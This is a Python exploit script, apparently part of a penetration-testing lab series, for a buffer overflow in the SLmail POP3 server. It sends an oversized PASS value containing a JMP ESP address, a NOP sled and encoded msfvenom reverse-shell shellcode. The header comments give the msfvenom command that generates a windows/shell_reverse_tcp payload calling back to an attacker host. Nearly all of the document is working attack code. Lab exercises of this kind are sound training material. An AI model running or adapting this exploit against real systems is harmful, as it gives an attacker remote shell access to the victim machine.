# PART 6: Generating shellcode
# This is the final exploit code for SLmail
#
# This part involves:
# 1. View all available payloads and select from one: msfvenom -l payloads
# 2. Generate a payload + removing bad chars from payload via. encoding:
#
#	msfvenom -p windows/shell_reverse_tcp
#		LHOST=[ip to send back reverse shell] LPORT=[port]
#		-f c
#		-e x86/shikata_ga_nai -b "\x00\x0a\x0d"
# 3. Pre-pending NOP instructions to our shellcode, so that our shellcode won't
#    be overwritten by Metasploit's decoder.

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

jmp_esp_addr = "\x8f\x35\x4a\x5f"

shellcode = ("\xdb\xc3\xd9\x74\x24\xf4\x58\xba\x71\xbf\xb9\x9d\x31\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x50\x13\x03\x21\xac\x5b\x68\x3d\x3a\x19"
"\x93\xbd\xbb\x7e\x1d\x58\x8a\xbe\x79\x29\xbd\x0e\x09\x7f\x32"
"\xe4\x5f\x6b\xc1\x88\x77\x9c\x62\x26\xae\x93\x73\x1b\x92\xb2"
"\xf7\x66\xc7\x14\xc9\xa8\x1a\x55\x0e\xd4\xd7\x07\xc7\x92\x4a"
"\xb7\x6c\xee\x56\x3c\x3e\xfe\xde\xa1\xf7\x01\xce\x74\x83\x5b"
"\xd0\x77\x40\xd0\x59\x6f\x85\xdd\x10\x04\x7d\xa9\xa2\xcc\x4f"
"\x52\x08\x31\x60\xa1\x50\x76\x47\x5a\x27\x8e\xbb\xe7\x30\x55"
"\xc1\x33\xb4\x4d\x61\xb7\x6e\xa9\x93\x14\xe8\x3a\x9f\xd1\x7e"
"\x64\xbc\xe4\x53\x1f\xb8\x6d\x52\xcf\x48\x35\x71\xcb\x11\xed"
"\x18\x4a\xfc\x40\x24\x8c\x5f\x3c\x80\xc7\x72\x29\xb9\x8a\x1a"
"\x9e\xf0\x34\xdb\x88\x83\x47\xe9\x17\x38\xcf\x41\xdf\xe6\x08"
"\xa5\xca\x5f\x86\x58\xf5\x9f\x8f\x9e\xa1\xcf\xa7\x37\xca\x9b"
"\x37\xb7\x1f\x0b\x67\x17\xf0\xec\xd7\xd7\xa0\x84\x3d\xd8\x9f"
"\xb5\x3e\x32\x88\x5c\xc5\xd5\xbd\xab\xc5\x0f\xaa\xa9\xc5\x4e"
"\x91\x27\x23\x3a\xf5\x61\xfc\xd3\x6c\x28\x76\x45\x70\xe6\xf3"
"\x45\xfa\x05\x04\x0b\x0b\x63\x16\xfc\xfb\x3e\x44\xab\x04\x95"
"\xe0\x37\x96\x72\xf0\x3e\x8b\x2c\xa7\x17\x7d\x25\x2d\x8a\x24"
"\x9f\x53\x57\xb0\xd8\xd7\x8c\x01\xe6\xd6\x41\x3d\xcc\xc8\x9f"
"\xbe\x48\xbc\x4f\xe9\x06\x6a\x36\x43\xe9\xc4\xe0\x38\xa3\x80"
"\x75\x73\x74\xd6\x79\x5e\x02\x36\xcb\x37\x53\x49\xe4\xdf\x53"
"\x32\x18\x40\x9b\xe9\x98\x70\xd6\xb3\x89\x18\xbf\x26\x88\x44"
"\x40\x9d\xcf\x70\xc3\x17\xb0\x86\xdb\x52\xb5\xc3\x5b\x8f\xc7"
"\x5c\x0e\xaf\x74\x5c\x1b")

string = "A"*2606 + jmp_esp_addr + "\x90"*16 + shellcode + "C"*(3500 - 2606 - 4 - 16 - 351)

try:
	print("Sending evil buffer...")
	connect = s.connect(('10.11.22.75', 110))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS {}".format(string) + "\r\n")
	s.close()
	print("\nDone")
except Exception as e:
	print(e)

